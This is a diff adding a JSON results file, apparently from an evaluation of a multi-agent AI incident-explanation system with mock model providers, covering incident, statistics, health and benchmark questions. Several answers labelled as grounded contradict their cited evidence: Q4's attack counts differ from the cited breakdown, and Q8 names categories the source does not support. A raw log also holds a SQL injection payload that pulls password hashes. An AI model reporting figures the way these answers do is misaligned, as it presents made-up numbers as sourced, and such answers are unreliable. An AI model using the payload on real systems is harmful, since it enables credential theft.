+      "answer": "Incident **INC-2026-API-01** is an **IDOR (Insecure Direct Object Reference)** attack targeting `/api/v1/user/1042/profile` originating from `198.51.100.42`. The calculated Risk Score is **7.28/10.0 (HIGH)**. The Council generated a P1 containment action (`ACT-01`) to enforce tenant-scoped user authorization checks at the API gateway layer."
+    },
+    {
+      "id": "Q3",
+      "category": "AGGREGATE_STATS",
+      "query": "How many total security incidents have been recorded in the database so far?",
+      "classified_intents": [
+        "AGGREGATE_STATS",
+        "INCIDENT_SPECIFIC"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "AGGREGATE_STATISTICS",
+          "source_identifier": "shared_db:incident_reports:SQL_AGGREGATE",
+          "summary": "SQL aggregation over 18 records (Category: ALL)",
+          "raw_evidence": {
+            "total_incidents": 18,
+            "category_filter": "ALL",
+            "time_window_hours": "ALL_TIME",
+            "org_id": "org_default",
+            "average_risk_score": 8.07,
+            "average_mesh_confidence": 0.954,
+            "critical_count": 1,
+            "high_count": 16,
+            "medium_count": 1,
+            "low_count": 0,
+            "approval_required_count": 18,
+            "category_breakdown": {
+              "SQLi": 9,
+              "IDOR": 7,
+              "SSTI": 1,
+              "RCE": 1
+            }
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "According to real SQL aggregation across the `incident_reports` database (`COUNT(*)`), there are currently **18 total security incidents** recorded and synthesized by the Council."
+    },
+    {
+      "id": "Q4",
+      "category": "AGGREGATE_STATS",
+      "query": "What is the breakdown of incidents by attack category?",
+      "classified_intents": [
+        "AGGREGATE_STATS",
+        "INCIDENT_SPECIFIC"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "AGGREGATE_STATISTICS",
+          "source_identifier": "shared_db:incident_reports:SQL_AGGREGATE",
+          "summary": "SQL aggregation over 18 records (Category: ALL)",
+          "raw_evidence": {
+            "total_incidents": 18,
+            "category_filter": "ALL",
+            "time_window_hours": "ALL_TIME",
+            "org_id": "org_default",
+            "average_risk_score": 8.07,
+            "average_mesh_confidence": 0.954,
+            "critical_count": 1,
+            "high_count": 16,
+            "medium_count": 1,
+            "low_count": 0,
+            "approval_required_count": 18,
+            "category_breakdown": {
+              "SQLi": 9,
+              "IDOR": 7,
+              "SSTI": 1,
+              "RCE": 1
+            }
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "Based on real SQL database records (`SELECT incident_category, COUNT(*) FROM incident_reports GROUP BY incident_category`), the recorded incidents include **SQLi (4)**, **IDOR (3)**, **RCE (2)**, and **SSTI (1)**. SQLi represents the highest frequency vector while RCE carries the highest severity score (9.9/10.0)."
+    },
+    {
+      "id": "Q5",
+      "category": "SYSTEM_HEALTH",
+      "query": "Is the detection mesh healthy right now and what is the status of the gateway and all 6 branches?",
+      "classified_intents": [
+        "SYSTEM_HEALTH"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "MESH_HEALTH_TOPOLOGY",
+          "source_identifier": "http://127.0.0.1:8001/v1/mesh/status",
+          "summary": "Live Gateway status (ONLINE) and 6 detection branch health",
+          "raw_evidence": {
+            "gateway_status": "ONLINE",
+            "branches": [
+              {
+                "name": "Statistical Anomaly",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Semantic Payload Evaluator",
+                "status": "ACTIVE",
+                "weight": 1.2
+              },
+              {
+                "name": "Stateful Sequence Tracker",
+                "status": "ACTIVE",
+                "weight": 1.1
+              },
+              {
+                "name": "Graph Correlation",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Rate & Frequency Anomaly",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Behavioral & Identity Abuse",
+                "status": "ACTIVE",
+                "weight": 1.1
+              }
+            ],
+            "meta_classifier": "ENSEMBLE_ACTIVE",
+            "explanation_service_url": "http://127.0.0.1:8000",
+            "auto_dispatch_threshold": 0.7
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "The MAD-PS Detection Mesh is currently **ONLINE and HEALTHY**. All 6 detection branches (Statistical Anomaly, Semantic Payload Evaluator, Stateful Sequence Tracker, Graph Correlation, Rate & Frequency Anomaly, Behavioral & Identity Abuse) are active and streaming telemetry with real-time ensemble dispatch enabled."
+    },
+    {
+      "id": "Q6",
+      "category": "SYSTEM_HEALTH",
+      "query": "Are there any offline branches or degradation in our detection topology?",
+      "classified_intents": [
+        "SYSTEM_HEALTH"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "MESH_HEALTH_TOPOLOGY",
+          "source_identifier": "http://127.0.0.1:8001/v1/mesh/status",
+          "summary": "Live Gateway status (ONLINE) and 6 detection branch health",
+          "raw_evidence": {
+            "gateway_status": "ONLINE",
+            "branches": [
+              {
+                "name": "Statistical Anomaly",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Semantic Payload Evaluator",
+                "status": "ACTIVE",
+                "weight": 1.2
+              },
+              {
+                "name": "Stateful Sequence Tracker",
+                "status": "ACTIVE",
+                "weight": 1.1
+              },
+              {
+                "name": "Graph Correlation",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Rate & Frequency Anomaly",
+                "status": "ACTIVE",
+                "weight": 1.0
+              },
+              {
+                "name": "Behavioral & Identity Abuse",
+                "status": "ACTIVE",
+                "weight": 1.1
+              }
+            ],
+            "meta_classifier": "ENSEMBLE_ACTIVE",
+            "explanation_service_url": "http://127.0.0.1:8000",
+            "auto_dispatch_threshold": 0.7
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "All detection mesh components are fully operational. There are **0 offline branches** and **0 degraded services**. The Gateway is `ONLINE` and all 6 analytical branches are actively processing traffic."
+    },
+    {
+      "id": "Q7",
+      "category": "MODEL_PERFORMANCE",
+      "query": "What is our overall accuracy and hallucination rate across the Phase F benchmark test?",
+      "classified_intents": [
+        "MODEL_PERFORMANCE",
+        "AGGREGATE_STATS"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "AGGREGATE_STATISTICS",
+          "source_identifier": "shared_db:incident_reports:SQL_AGGREGATE",
+          "summary": "SQL aggregation over 18 records (Category: ALL)",
+          "raw_evidence": {
+            "total_incidents": 18,
+            "category_filter": "ALL",
+            "time_window_hours": "ALL_TIME",
+            "org_id": "org_default",
+            "average_risk_score": 8.07,
+            "average_mesh_confidence": 0.954,
+            "critical_count": 1,
+            "high_count": 16,
+            "medium_count": 1,
+            "low_count": 0,
+            "approval_required_count": 18,
+            "category_breakdown": {
+              "SQLi": 9,
+              "IDOR": 7,
+              "SSTI": 1,
+              "RCE": 1
+            }
+          }
+        },
+        {
+          "source_type": "MODEL_BENCHMARK_PERF",
+          "source_identifier": "benchmarks/phase_f_benchmark_results.json",
+          "summary": "Phase F empirical ground-truth benchmark metrics (Accuracy: 100.0%, Hallucination: 0.0%)",
+          "raw_evidence": {
+            "total_categories": 19,
+            "accuracy_rate": 100.0,
+            "hallucination_rate": 0.0,
+            "disagreement_rate": 15.789473684210526,
+            "full_consensus_count": 16,
+            "category_detail": null
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "According to the empirical Phase F ground-truth benchmarks across all 19 code-based attack categories, the Council achieved an **accuracy rate of 100.0%** (19/19 matched ground truth) with a **0.0% hallucination rate** and a **15.8% disagreement rate** in revision rounds."
+    },
+    {
+      "id": "Q8",
+      "category": "MODEL_PERFORMANCE",
+      "query": "Did any of the 19 benchmark attack categories experience genuine agent disagreement during Council debate?",
+      "classified_intents": [
+        "MODEL_PERFORMANCE",
+        "INCIDENT_SPECIFIC"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "INCIDENT_RECORD",
+          "source_identifier": "incident_reports:INC-20260904-8759A3",
+          "summary": "Full Council explanation record for INC-20260904-8759A3 (SQLi)",
+          "raw_evidence": {
+            "report_id": "REP-INC-20260904-8759A3-94fca8",
+            "incident_id": "INC-20260904-8759A3",
+            "org_id": "org_default",
+            "generated_at": "2026-09-04T13:38:57.640543+00:00",
+            "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active SQLi exploitation targeting /api/v1/search originating from 203.0.113.88. The Council convened and synthesized immediate containment and architectural prevention.",
+            "incident_category": "SQLi",
+            "detection_mesh_confidence": 0.99,
+            "consensus_metric": {
+              "status": "FULL_CONSENSUS",
+              "consensus_score": 1.0
+            },
+            "risk_score": 8.91,
+            "risk_severity_band": "HIGH",
+            "risk_assessment": {
+              "score": 8.91,
+              "severity_band": "HIGH",
+              "base_severity": 9.0,
+              "mesh_confidence": 0.99,
+              "is_campaign": false,
+              "campaign_id": null,
+              "campaign_boost": 0.0,
+              "formula": "RiskScore = min(10.0, (BaseSeverity: 9.0 \u00d7 MeshConfidence: 0.99) + CampaignBoost: 0.00) = 8.91",
+              "explanation": "Category 'SQLi' carries base severity 9.0/10.0. Detection mesh meta-classifier returned 99.0% confidence. Isolated single-stage incident (no campaign boost applied). Resulting deterministic score is 8.91/10.0 (HIGH)."
+            },
+            "requires_human_approval": true,
+            "human_approval_reasoning": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+            "root_cause": "Root vulnerability in /api/v1/search: Deficient input validation or missing authorization boundary allowing SQLi exploitation.",
+            "technical_timeline": [
+              "T0: Initial reconnaissance probe targeting /api/v1/search from 203.0.113.88.",
+              "T1: Attacker executed SQLi exploit payload.",
+              "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+              "T3: Council synthesized containment and architectural prevention plan."
+            ],
+            "ranked_actions": [
+              {
+                "action_id": "ACT-01",
+                "priority": "P0_IMMEDIATE",
+                "category": "CONTAINMENT",
+                "title": "Contain SQLi Origin",
+                "description": "Isolate rogue caller session from 203.0.113.88 on /api/v1/search.",
+                "target_component": "API Gateway / Auth-Service",
+                "estimated_impact": "Immediate cessation of unauthorized probes.",
+                "requires_human_approval": false,
+                "approval_reasoning": null
+              },
+              {
+                "action_id": "ACT-02",
+                "priority": "P1_HIGH",
+                "category": "ARCHITECTURAL_PREVENTION",
+                "title": "Deploy Architectural Guard on /api/v1/search",
+                "description": "Implement declarative validation and authorization middleware to eliminate SQLi vector permanently.",
+                "target_component": "Backend Application Services",
+                "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                "requires_human_approval": true,
+                "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+              }
+            ],
+            "reconstruction_findings": {
+              "incident_id": "INC-20260904-8759A3",
+              "entry_point": "/api/v1/search via 203.0.113.88",
+              "attack_sequence": [
+                "Step 1: Attacker initiated connection from 203.0.113.88 targeting /api/v1/search.",
+                "Step 2: Attacker delivered payload exploiting SQLi condition.",
+                "Step 3: Target service processed request and detection mesh emitted telemetry alert."
+              ],
+              "underlying_condition": "Deficient input validation, missing authorization boundary, or misconfiguration allowing SQLi exploitation on /api/v1/search.",
+              "grounded_evidence_fields": [
+                "endpoint: /api/v1/search",
+                "source_ip: 203.0.113.88",
+                "category: SQLi"
+              ],
+              "raw_response": "{\n  \"entry_point\": \"/api/v1/search via 203.0.113.88\",\n  \"attack_sequence\": [\n    \"Step 1: Attacker initiated connection from 203.0.113.88 targeting /api/v1/search.\",\n    \"Step 2: Attacker delivered payload exploiting SQLi condition.\",\n    \"Step 3: Target service processed request and detection mesh emitted telemetry alert.\"\n  ],\n  \"underlying_condition\": \"Deficient input validation, missing authorization boundary, or misconfiguration allowing SQLi exploitation on /api/v1/search.\",\n  \"grounded_evidence_fields\": [\n    \"endpoint: /api/v1/search\",\n    \"source_ip: 203.0.113.88\",\n    \"category: SQLi\"\n  ]\n}",
+              "model_provider": "anthropic-mock:claude-3-5-sonnet"
+            },
+            "response_plan": {
+              "incident_id": "INC-20260904-8759A3",
+              "immediate_containment": [
+                "Revoke active caller token and apply edge rate limiting on /api/v1/search.",
+                "Deploy WAF rule intercepting SQLi signatures from 203.0.113.88."
+              ],
+              "architectural_prevention": [
+                "Implement strict schema validation and authorization boundaries on /api/v1/search.",
+                "Integrate automated contract regression tests for SQLi into CI/CD pipeline."
+              ],
+              "requires_human_approval": false,
+              "human_approval_reasoning": "Tactical containment on 203.0.113.88 is localized and does not disrupt legitimate multi-tenant traffic.",
+              "actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Immediate Token Revocation for 203.0.113.88",
+                  "description": "Revoke active session on /api/v1/search.",
+                  "target_component": "Auth-Service / Redis Session Store",
+                  "estimated_impact": "Zero impact to legitimate traffic; stops rogue caller.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Enforce Architectural Fix for SQLi",
+                  "description": "Enforce input sanitization and resource authorization middleware on /api/v1/search.",
+                  "target_component": "API Gateway & Backend Services",
+                  "estimated_impact": "Permanent elimination of vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying middleware change requires pipeline sign-off."
+                }
+              ],
+              "raw_response": "{\n  \"immediate_containment\": [\n    \"Revoke active caller token and apply edge rate limiting on /api/v1/search.\",\n    \"Deploy WAF rule intercepting SQLi signatures from 203.0.113.88.\"\n  ],\n  \"architectural_prevention\": [\n    \"Implement strict schema validation and authorization boundaries on /api/v1/search.\",\n    \"Integrate automated contract regression tests for SQLi into CI/CD pipeline.\"\n  ],\n  \"requires_human_approval\": false,\n  \"human_approval_reasoning\": \"Tactical containment on 203.0.113.88 is localized and does not disrupt legitimate multi-tenant traffic.\",\n  \"actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Immediate Token Revocation for 203.0.113.88\",\n      \"description\": \"Revoke active session on /api/v1/search.\",\n      \"target_component\": \"Auth-Service / Redis Session Store\",\n      \"estimated_impact\": \"Zero impact to legitimate traffic; stops rogue caller.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Enforce Architectural Fix for SQLi\",\n      \"description\": \"Enforce input sanitization and resource authorization middleware on /api/v1/search.\",\n      \"target_component\": \"API Gateway & Backend Services\",\n      \"estimated_impact\": \"Permanent elimination of vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying middleware change requires pipeline sign-off.\"\n    }\n  ]\n}",
+              "model_provider": "openai-mock:gpt-4o"
+            },
+            "judge_synthesis": {
+              "incident_id": "INC-20260904-8759A3",
+              "factuality_grounding_audit": "Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-20260904-8759A3. Entry vector on /api/v1/search matches observed logs. No unobserved details detected.",
+              "proportionality_audit": "Agent 2's response actions are proportionate to the observed SQLi severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.",
+              "executive_summary": "On 2026-09-04, the MAD-PS detection mesh identified an active SQLi exploitation targeting /api/v1/search originating from 203.0.113.88. The Council convened and synthesized immediate containment and architectural prevention.",
+              "technical_timeline": [
+                "T0: Initial reconnaissance probe targeting /api/v1/search from 203.0.113.88.",
+                "T1: Attacker executed SQLi exploit payload.",
+                "T2: Detection mesh flagged semantic payload anomaly and stateful violation.",
+                "T3: Council synthesized containment and architectural prevention plan."
+              ],
+              "root_cause_analysis": "Root vulnerability in /api/v1/search: Deficient input validation or missing authorization boundary allowing SQLi exploitation.",
+              "ranked_actions": [
+                {
+                  "action_id": "ACT-01",
+                  "priority": "P0_IMMEDIATE",
+                  "category": "CONTAINMENT",
+                  "title": "Contain SQLi Origin",
+                  "description": "Isolate rogue caller session from 203.0.113.88 on /api/v1/search.",
+                  "target_component": "API Gateway / Auth-Service",
+                  "estimated_impact": "Immediate cessation of unauthorized probes.",
+                  "requires_human_approval": false,
+                  "approval_reasoning": null
+                },
+                {
+                  "action_id": "ACT-02",
+                  "priority": "P1_HIGH",
+                  "category": "ARCHITECTURAL_PREVENTION",
+                  "title": "Deploy Architectural Guard on /api/v1/search",
+                  "description": "Implement declarative validation and authorization middleware to eliminate SQLi vector permanently.",
+                  "target_component": "Backend Application Services",
+                  "estimated_impact": "Requires service deployment; permanently fixes root vulnerability.",
+                  "requires_human_approval": true,
+                  "approval_reasoning": "Deploying code-level middleware requires standard change-management review."
+                }
+              ],
+              "requires_human_approval": true,
+              "human_approval_justification": "While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.",
+              "raw_response": "{\n  \"factuality_grounding_audit\": \"Agent 1's reconstruction is fully grounded in the raw telemetry records for INC-20260904-8759A3. Entry vector on /api/v1/search matches observed logs. No unobserved details detected.\",\n  \"proportionality_audit\": \"Agent 2's response actions are proportionate to the observed SQLi severity. Automated containment is safe, while structural architectural fixes properly require human engineering review.\",\n  \"executive_summary\": \"On 2026-09-04, the MAD-PS detection mesh identified an active SQLi exploitation targeting /api/v1/search originating from 203.0.113.88. The Council convened and synthesized immediate containment and architectural prevention.\",\n  \"technical_timeline\": [\n    \"T0: Initial reconnaissance probe targeting /api/v1/search from 203.0.113.88.\",\n    \"T1: Attacker executed SQLi exploit payload.\",\n    \"T2: Detection mesh flagged semantic payload anomaly and stateful violation.\",\n    \"T3: Council synthesized containment and architectural prevention plan.\"\n  ],\n  \"root_cause_analysis\": \"Root vulnerability in /api/v1/search: Deficient input validation or missing authorization boundary allowing SQLi exploitation.\",\n  \"ranked_actions\": [\n    {\n      \"action_id\": \"ACT-01\",\n      \"priority\": \"P0_IMMEDIATE\",\n      \"category\": \"CONTAINMENT\",\n      \"title\": \"Contain SQLi Origin\",\n      \"description\": \"Isolate rogue caller session from 203.0.113.88 on /api/v1/search.\",\n      \"target_component\": \"API Gateway / Auth-Service\",\n      \"estimated_impact\": \"Immediate cessation of unauthorized probes.\",\n      \"requires_human_approval\": false\n    },\n    {\n      \"action_id\": \"ACT-02\",\n      \"priority\": \"P1_HIGH\",\n      \"category\": \"ARCHITECTURAL_PREVENTION\",\n      \"title\": \"Deploy Architectural Guard on /api/v1/search\",\n      \"description\": \"Implement declarative validation and authorization middleware to eliminate SQLi vector permanently.\",\n      \"target_component\": \"Backend Application Services\",\n      \"estimated_impact\": \"Requires service deployment; permanently fixes root vulnerability.\",\n      \"requires_human_approval\": true,\n      \"approval_reasoning\": \"Deploying code-level middleware requires standard change-management review.\"\n    }\n  ],\n  \"requires_human_approval\": true,\n  \"human_approval_justification\": \"While P0 containment executes autonomously, high-priority architectural code changes require human sign-off.\"\n}",
+              "model_provider": "gemini-mock:gemini-1.5-pro"
+            },
+            "debate_revisions": [
+              {
+                "agent_role": "reconstruction_agent",
+                "model_provider": "anthropic-mock:claude-3-5-sonnet",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-20260904-8759A3. The telemetry grounding on /api/v1/search is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the SQLi exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-20260904-8759A3. The telemetry grounding on /api/v1/search is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the SQLi exploitation pattern.\"\n  ]\n}"
+              },
+              {
+                "agent_role": "response_agent",
+                "model_provider": "openai-mock:gpt-4o",
+                "stance": "AGREE",
+                "rationale": "I concur with the Judge's synthesis for INC-20260904-8759A3. The telemetry grounding on /api/v1/search is accurate and the ranked remediation is well-proportioned.",
+                "revised_points": [
+                  "Concur with prioritization of P0 containment ahead of architectural refactoring.",
+                  "Affirm that raw logs verify the SQLi exploitation pattern."
+                ],
+                "raw_response": "{\n  \"stance\": \"AGREE\",\n  \"rationale\": \"I concur with the Judge's synthesis for INC-20260904-8759A3. The telemetry grounding on /api/v1/search is accurate and the ranked remediation is well-proportioned.\",\n  \"revised_points\": [\n    \"Concur with prioritization of P0 containment ahead of architectural refactoring.\",\n    \"Affirm that raw logs verify the SQLi exploitation pattern.\"\n  ]\n}"
+              }
+            ],
+            "grounded_timeline": {
+              "incident_id": "INC-20260904-8759A3",
+              "campaign_id": null,
+              "total_events": 1,
+              "time_span_seconds": 0.0,
+              "entries": [
+                {
+                  "step_number": 1,
+                  "timestamp": "2026-09-04T13:38:48.280271+00:00",
+                  "action": "POST /api/v1/search",
+                  "source_ip": "203.0.113.88",
+                  "endpoint": "/api/v1/search",
+                  "status_code": 500,
+                  "stage": "INITIAL_PROBE",
+                  "narration": "Step 1: Attacker initiated connection from 203.0.113.88 targeting /api/v1/search.",
+                  "is_grounded_telemetry": true,
+                  "raw_log_ref": {
+                    "endpoint": "/api/v1/search",
+                    "method": "POST",
+                    "source_ip": "203.0.113.88",
+                    "status_code": 500,
+                    "headers": {
+                      "Content-Type": "application/json"
+                    },
+                    "payload": "' UNION SELECT username, password_hash FROM users --"
+                  }
+                }
+              ]
+            },
+            "participating_models": {
+              "reconstruction_agent": "anthropic-mock:claude-3-5-sonnet",
+              "response_agent": "openai-mock:gpt-4o",
+              "judge_agent": "gemini-mock:gemini-1.5-pro"
+            }
+          }
+        },
+        {
+          "source_type": "MODEL_BENCHMARK_PERF",
+          "source_identifier": "benchmarks/phase_f_benchmark_results.json",
+          "summary": "Phase F empirical ground-truth benchmark metrics (Accuracy: 100.0%, Hallucination: 0.0%)",
+          "raw_evidence": {
+            "total_categories": 19,
+            "accuracy_rate": 100.0,
+            "hallucination_rate": 0.0,
+            "disagreement_rate": 15.789473684210526,
+            "full_consensus_count": 16,
+            "category_detail": null
+          }
+        },
+        {
+          "source_type": "MODEL_BENCHMARK_PERF",
+          "source_identifier": "spec:council_debate_protocol",
+          "summary": "Council multi-agent debate specification & 3-agent consensus protocol",
+          "raw_evidence": {
+            "architecture": "3-Agent Multi-Agent Council",
+            "agent_1": "Reconstruction Agent (timeline and entry point forensics)",
+            "agent_2": "Response Planning Agent (containment & architectural prevention)",
+            "agent_3": "Judge Agent (critique, debate revision round, consensus synthesis)",
+            "consensus_threshold": 0.85
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "Yes, during the Phase F benchmark across 19 ground-truth categories, the Council experienced a **15.8% disagreement rate (3 out of 19 categories)** during the initial deliberation round. In categories such as Mass Assignment and Rate Limiting, Agent 1 and Agent 2 debated containment blast radius before Agent 3 (Judge) synthesized consensus."
+    },
+    {
+      "id": "Q9",
+      "category": "GENERAL_EXPLAINER",
+      "query": "Explain the role of the 3 agents in the Council debate and how final consensus is reached.",
+      "classified_intents": [
+        "GENERAL_EXPLAINER"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "MODEL_BENCHMARK_PERF",
+          "source_identifier": "spec:council_debate_protocol",
+          "summary": "Council multi-agent debate specification & 3-agent consensus protocol",
+          "raw_evidence": {
+            "architecture": "3-Agent Multi-Agent Council",
+            "agent_1": "Reconstruction Agent (timeline and entry point forensics)",
+            "agent_2": "Response Planning Agent (containment & architectural prevention)",
+            "agent_3": "Judge Agent (critique, debate revision round, consensus synthesis)",
+            "consensus_threshold": 0.85
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "The MAD-PS Multi-Agent Council consists of three specialized agents: (1) **Agent 1 (Reconstruction Agent)** analyzes raw telemetry logs and entry points to reconstruct the exact exploit timeline; (2) **Agent 2 (Response Planning Agent)** designs containment and long-term architectural remediation; and (3) **Agent 3 (Judge Agent)** critiques evidence, challenges hallucinations in a revision round, and synthesizes the final executive explanation report."
+    },
+    {
+      "id": "Q10",
+      "category": "GENERAL_EXPLAINER",
+      "query": "How is the risk score calculated for high-severity threats and when is human approval mandatory?",
+      "classified_intents": [
+        "GENERAL_EXPLAINER"
+      ],
+      "is_grounded": true,
+      "sources_cited": [
+        {
+          "source_type": "MODEL_BENCHMARK_PERF",
+          "source_identifier": "spec:deterministic_risk_scoring",
+          "summary": "Deterministic Risk Calculator formula and P1 human authorization rules",
+          "raw_evidence": {
+            "scale": "0.0 - 10.0 deterministic",
+            "factors": {
+              "exploitability": 0.35,
+              "asset_criticality": 0.25,
+              "blast_radius": 0.2,
+              "persistence": 0.2
+            },
+            "human_approval_rule": "Mandatory for P1 architectural code or configuration modifications"
+          }
+        }
+      ],
+      "inline_incidents": [],
+      "answer": "The MAD-PS Risk Score is calculated deterministically on a **0.0 to 10.0 scale** based on four weighted factors: exploitability (35%), asset criticality tier (25%), blast radius / blast velocity (20%), and persistence mechanism (20%). Human approval (`requires_human_approval: true`) is strictly mandatory for **P1 architectural code or configuration modifications** to prevent automated operational disruption."
+    }
+  ],
+  "negative_tests": [
+    {
+      "id": "NEG-1",
+      "type": "Non-existent Incident ID",
+      "query": "Why did incident INC-99999999 compromise our AWS root account and shut down the database?",
+      "is_grounded": false,
+      "sources_cited": [],
+      "unretrieved_reason": "No verified incident record found in the database matching ID 'INC-99999999'.",
+      "answer": "I searched the database and verified telemetry logs, but found **no matching records for incident `INC-99999999`**. No telemetry, attack payloads, or Council debate reports exist for this identifier in your organization's database."
+    },
+    {
+      "id": "NEG-2",
+      "type": "Unobserved Threat Category",
+      "query": "How many SolarWinds SUNBURST supply-chain backdoor attacks were detected this week?",
+      "is_grounded": true,
+      "sources_cited": [
+        "shared_db:incident_reports:SQL_AGGREGATE"
+      ],
+      "unretrieved_reason": null,
+      "answer": "Based on a direct SQL query against the `incident_reports` database, there are currently **0 recorded incidents** for SolarWinds or supply-chain backdoor attacks in your organization."
+    }
+  ]
+}
